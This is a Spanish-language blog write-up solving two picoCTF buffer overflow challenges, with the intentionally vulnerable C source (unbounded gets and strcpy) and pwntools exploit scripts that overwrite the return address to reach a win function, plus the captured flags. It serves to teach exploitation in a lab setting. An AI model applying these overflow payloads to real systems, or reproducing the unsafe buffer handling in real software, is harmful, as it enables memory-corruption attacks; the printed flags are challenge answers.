---
title: Overflow Part 1
time: 2024-12-07 12:00:00
categories: [Infosec, Pwn]
tags: [Infosec, WriteUps, Pwn]
image: /assets/posts/Overflow-1/Overflow1.jpg
---

# Hola a todos!

Overflow es una serie donde trato de explicar desbordamientos del buffer a través de la resolución de algunos retos de la plataforma picoCTF.

Esta serie esta hecha con el fin de guardar el aprendizaje y de utilidad para quien lo lea.

## Empezando

Bien, primero que todo es necesario entender como ocurre un buffer overflow, como saber si un programa es vulnerable a traves del análisis de su código mediante funciones vulnerables, para no hscer este post tan largo explicando como funciona todo esto por aqui dejo un recurso que puede ayudar al entendimiento:

[Buffer Overflow: Que son y como funcionan](https://www.welivesecurity.com/la-es/2014/11/05/como-funcionan-buffer-overflow/)

### Funciones vulnerables(Buffer Overflow):

`strcpy`, `strcat`: No verifican los límites del buffer destino.

`gets`: Lee hasta encontrar un salto de línea, pero sin limitar el tamaño.

`sprintf`: No controla el tamaño del buffer de salida.

`scanf` (con %s): Si no se especifica un límite de tamaño.

`strncpy`, `strncat`: Aunque más seguras, aún pueden ser mal usadas si los límites no se calculan correctamente.

## Reto 1: Puedes desbordar el buffer correcto?(BufferOverflow1)

Para todos los retos tenemos el código del ejecutable a explotar, asi que no es necesario hacer reversing para obtener el mismo:

El código en C es el siguiente:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
Analizando el código podemos observar que el programa esta tomando nuestro input y lo esta leyendo con la función vulnerable `gets`, lo que nos permite escribir mas alla del buffer definido por el programa, para explotar este binario tenemos que lograr que el programa apunte a la siguiente dirección sobreescribiendo la dirección de retorno para obtener la flag, para ello monte el siguiente exploit en python usando la librería de pwntools:

```python
from pwn import *

host = "saturn.picoctf.net"
port = 63304 #Cambiar puerto por nueva instancia

binary = remote(host, port)

payload = b"A"*60

binary.recvuntil(b"Input:")
binary.sendline(payload)

response = binary.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
```
`
Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
`

## Reto 2: My First Ret2Win?(Buffer Overflow1)

En este reto más allá de lograr que ocurra el buffer overflow debemos hacer llamada a la función `win` controlando la dirección de retorno, como hacemos esto? Bueno aquí vamos.

El codigo en C del ejecutable:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Observando el código podemos ver que seguimos explotando la función vulnerable `gets`, sin embargo en este reto debemos controlar la cantidad de caracteres a introducir para determinar a partir de que punto se empieza a sobreescribir la dirección de retorno para justo 1 byte antes de sobreescribirla lograr hacer que esta apunte a la dirección de la función `win`.

Para lograr esto utilizamos el debugguer gdb-peda, creamos un pattern con un valor de 60 caracteres y se lo pasamos al programa, una vez echo esto podemos determinar el offset para empezar a sobreescribir la dirección de retorno.

El offset es de 44 caracteres por lo que a partir de 44 caracteres estaremos apuntando a lo que queramos en este caso a la dirección de la función `win`(En este punto es necesito tener los conceptos necesarios para utilizar debuggers, etc), la cual es `0x080491f6`.

Exploit en python 

```python
from pwn import *

host = 'saturn.picoctf.net'
port = 56983 #Cambia el puerto segun la instancia

p = remote(host, port)

win_addr = p32(0x080491f6)

payload = b'A' * 44 + win_addr

p.sendline(payload)
response = p.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
```

Teniendo que el binario es de 32bits y utiliza el formato little endian empaquetamos la dirección de la función `win(0x080491f6)` para pasarla al programa en el formato mencionado, luego hacemos que la dirección de retorno apunte a la dirección `win` y obtenemos la flag.
`
Flag: picoCTF{addr3ss3s_ar3_3asy_60fac6aa}
`

Esta serie tendra otro siguiente artículo donde resuelvo los 2 últimos retos de la serie, los cuales tienen una mayor dificultad.

# Gracias por leer!
